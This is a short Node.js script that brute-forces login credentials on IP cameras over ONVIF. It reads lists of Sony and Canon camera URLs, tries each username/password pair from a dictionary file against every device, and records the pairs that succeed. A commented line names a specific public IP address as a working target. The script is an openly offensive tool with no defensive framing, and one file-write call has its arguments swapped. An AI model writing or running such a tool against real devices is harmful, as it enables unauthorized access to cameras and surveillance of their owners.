const onvif = require("node-onvif");
const { writeFileSync, createReadStream } = require("fs");

console.log("Start the discovery process.");
// const workingUrls = [{ url: "http://202.175.114.212/", user: "", pass: "" }];

const authList = require("./dict.json");

const files = ["sony", "canon"];

async function main() {
    Promise.all(
        files.map(async (file) => {
            var lineReader = require("readline").createInterface({
                input: createReadStream(file + ".txt"),
                crlfDelay: Infinity,
            });
            writeFileSync("sim\n", "output.txt", { flag: "w" });

            for await (const line of lineReader) {
                for (const auth of authList) {
                    await testUrl(line.trim(), auth.user, auth.pass, file);
                }
            }
        })
    );
}

async function testUrl(url, user, pass, file) {
    let device = new onvif.OnvifDevice({
        xaddr: url + "/onvif/device_service",
        user: user,
        pass: pass,
    });
    try {
        const info = await device.init();
        writeFileSync(
            `output-${file}.txt`,
            JSON.stringify({ url, user, pass }),
            { flag: "a" }
        );
        console.log(url, user, pass);
        return;
    } catch (error) {
        console.log(url, user, pass, error.message);
        return;
    }
}

main();
